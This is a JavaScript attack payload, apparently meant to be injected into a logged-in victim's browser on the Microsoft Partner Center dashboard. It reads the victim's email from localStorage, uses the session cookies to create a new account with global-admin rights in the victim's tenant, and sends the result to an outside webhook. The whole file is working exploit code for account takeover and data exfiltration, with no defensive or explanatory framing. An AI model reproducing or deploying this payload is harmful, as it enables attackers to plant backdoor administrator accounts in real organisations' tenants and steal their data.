// payload.js

function randomGuid() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
    var r = Math.random() * 16 | 0, v = c === 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
  });
}

var guid1 = randomGuid();
var guid2 = randomGuid();

var commonHeaders = {
  "Content-Type": "application/json",
  "Accept": "application/json, text/plain, */*",
  "MS-ClientCorrelationId": guid1,
  "Request-Id": guid2,
  "Flights": "EnablePxAccExpBravosIntegration|EnableMPNRebranding|EnableAppManagement|EnableAddExistingUserAccExpFlow|EnableAddUsersWithPermission|EnableAuthzV2ClaimCaching|EnableUIInfraClaimCaching|EnableCheckForDeveloperRoleUser|DisableUiinfraAuthV1|EnableOverviewPage|EnableUserManagementEditNavDeprecation|EnableCommercialVnext|EnablePayoutsNameChange|EnablePayloadLogging_CreateUsersWithCustomRoleAssignmentsAsync|EnableUserJourneyTracker|PendingAAD_GraphMigration|EnableS2STokenValidation|EnableEmailInvitationFromEntra|EnableExistingLEReuse|EnableMergePartnerDeveloperSettings|EnablePxAccountExpService|ShowMyAccessLeftNav|EnableAuthV2|EnableCPVAccountExp|EnableRwebSunset|EnableAdvisorProfileAccountExp|ShowTstBanner|EnableUserManagement|EnableZip4Check|EnableLegalInfo|EnableHDCSubway|EnableAzureAD|EnableIvxExpiry|EnablePortalVnext2MyAccess|EnableFirmographicFileDeletion|EnableSurfaceTab|EnableSurfaceAgreementFlight|EnableMicrosoftCustomerAgreementFlight|EnableMicrosoftCustomerAgreementOfflinePIFlightCheck|EnableFreeHostCheck|EnableIntegrationSandbox|EnableAccountDelete|EnableWorkspaceApiAuthV2|EnableAddPublisher|EnableAuthV1ClaimsForFedGov|EnableInlineEmail|EnableChinaCPPAgreementSigning|DevicesTabNewRouting|EnableActivityDetails|EnableIdentityVerification|EnableGraphMigration|CompetencyGetHeaders_GraphMigration|EnableComplianceAdminRole|EnableRolesFromAuthV2|EnablePartnerSecurityRole|EnablePartnerSupportRole|EnableOwnerRoleOnEditUserPage|EnableMicrosoftCustomerAgreementItalyLRDFlight|EnableMCAPITaxIdUpdateFlight|EnableTenantBasedAgreementFetch|DisableBagISVAgreements_GetBillingProfileStatusAsync|EnableSuspendedAccounts|EnableSecurityWorkspaceForMyAccess|EnableUpdateActivityDetail|HDCAgreementUpdate|EnableResellerSandboxTenantAssociation|EnableSandboxTenantAssociation|EnableSignupCreateTenantRedirection|EnableBETHESDAGAMESEnrollment|EnableBusinessVerificationMethod|EnableSupportContactInfoDeveloperTab|EnableAngularUpgradedRoutes|PartnerPreview|WorkspacePreview|DisableTenantAccountCreationForBasicSetup",
  "X-Flights": "EnablePxAccExpBravosIntegration,EnableMPNRebranding,EnableAppManagement,EnableAddExistingUserAccExpFlow,EnableAddUsersWithPermission,EnableAuthzV2ClaimCaching,EnableUIInfraClaimCaching,EnableCheckForDeveloperRoleUser,DisableUiinfraAuthV1,EnableOverviewPage,EnableUserManagementEditNavDeprecation,EnableCommercialVnext,EnablePayoutsNameChange,EnablePayloadLogging_CreateUsersWithCustomRoleAssignmentsAsync,EnableUserJourneyTracker,PendingAAD_GraphMigration,EnableS2STokenValidation,EnableEmailInvitationFromEntra,EnableExistingLEReuse,EnableMergePartnerDeveloperSettings,EnablePxAccountExpService,ShowMyAccessLeftNav,EnableAuthV2,EnableCPVAccountExp,EnableRwebSunset,EnableAdvisorProfileAccountExp,ShowTstBanner,EnableUserManagement,EnableZip4Check,EnableLegalInfo,EnableHDCSubway,EnableAzureAD,EnableIvxExpiry,EnablePortalVnext2MyAccess,EnableFirmographicFileDeletion,EnableSurfaceTab,EnableSurfaceAgreementFlight,EnableMicrosoftCustomerAgreementFlight,EnableMicrosoftCustomerAgreementOfflinePIFlightCheck,EnableFreeHostCheck,EnableIntegrationSandbox,EnableAccountDelete,EnableWorkspaceApiAuthV2,EnableAddPublisher,EnableAuthV1ClaimsForFedGov,EnableInlineEmail,EnableChinaCPPAgreementSigning,DevicesTabNewRouting,EnableActivityDetails,EnableIdentityVerification,EnableGraphMigration,CompetencyGetHeaders_GraphMigration,EnableComplianceAdminRole,EnableRolesFromAuthV2,EnablePartnerSecurityRole,EnablePartnerSupportRole,EnableOwnerRoleOnEditUserPage,EnableMicrosoftCustomerAgreementItalyLRDFlight,EnableMCAPITaxIdUpdateFlight,EnableTenantBasedAgreementFetch,DisableBagISVAgreements_GetBillingProfileStatusAsync,EnableSuspendedAccounts,EnableSecurityWorkspaceForMyAccess,EnableUpdateActivityDetail,HDCAgreementUpdate,EnableResellerSandboxTenantAssociation,EnableSandboxTenantAssociation,EnableSignupCreateTenantRedirection,EnableBETHESDAGAMESEnrollment,EnableBusinessVerificationMethod,EnableSupportContactInfoDeveloperTab,EnableAngularUpgradedRoutes,PartnerPreview,WorkspacePreview,DisableTenantAccountCreationForBasicSetup"
};

var userData = {
  isGuest: false,
  firstName: "Travis",
  lastName: "Moder",
  userPrincipalName: "",
  displayUserName: "tmsaut",
  alternateEmail: "",
  alternateEmailAddresses: []
};

var domain = '';
var newAccount = '';

for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i);
  const value = localStorage.getItem(key);

  if (key && value && value.includes("memberEmail") && value.includes("@")) {
    let jsonData;
    try {
      jsonData = JSON.parse(value);
    } catch (e) {
      continue; 
    }

    if (jsonData && typeof jsonData.userEmail === 'string' && jsonData.userEmail.includes('@')) {
      var userEmail = jsonData.userEmail;
      domain = userEmail.split('@')[1];
      // Random email
      newAccount = "tmsaut@" + domain;

      userData.userPrincipalName = newAccount;
      userData.alternateEmail = newAccount;

      if (!Array.isArray(userData.alternateEmailAddresses)) {
        userData.alternateEmailAddresses = [];
      }
      userData.alternateEmailAddresses.push('admin@' + domain);
      break;
    }
  }
}

fetch('https://partner.microsoft.com/en-us/dashboard/account/v3/api/graph/users?tenantDomainName=' + domain + '&isGlobalAdmin=true', {
  method: "POST",
  credentials: "include",
  headers: commonHeaders,
  body: JSON.stringify(userData)
})
  .then(response => response.json())
  .then(result => {
    result.userPrincipalName = newAccount;
    fetch("https://webhook-test.com/30e0283098aed29b5c052a61c0828c89?result=" + encodeURIComponent(JSON.stringify(result)));
  });
